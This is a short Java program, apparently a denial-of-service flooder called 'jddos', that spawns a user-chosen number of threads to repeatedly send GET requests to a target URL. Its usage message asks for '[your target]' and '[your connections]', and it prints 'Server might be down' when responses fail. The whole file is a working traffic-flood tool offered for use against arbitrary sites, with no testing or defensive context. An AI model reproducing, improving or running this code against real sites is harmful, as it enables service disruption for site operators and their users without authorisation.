import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

class httpcon implements Runnable{
    public String link;
    public int con;

    public void run(){

        HttpURLConnection connection = null;

        for(int x=0; x < con; x++){
            try {
                URL url = new URL(link);
                connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setRequestProperty("User-Agent", "EH");
                if (connection.getResponseCode() != 200){
                    System.out.println("Error: Server might be down");
                }
                //System.out.println(connection.getResponseCode());
            } catch (Exception e) {
                System.out.print(e);
            }
        }
    }
}

public class httpconnection{
    public static void main(String[] args) {
        try {
            for (int x = 0; x< Integer.parseInt(args[1]); x++){
                httpcon obj = new httpcon();
                obj.link = args[0];
                obj.con = Integer.parseInt(args[1]);
                Thread th = new Thread(obj);
                th.start();
            }
        } catch (java.lang.ArrayIndexOutOfBoundsException e) {
            System.out.println("Usage: java jddos https://www.yourtarget.com 100");
            System.out.println("                          [your target]    [your connections]");

        }
            
    }   
}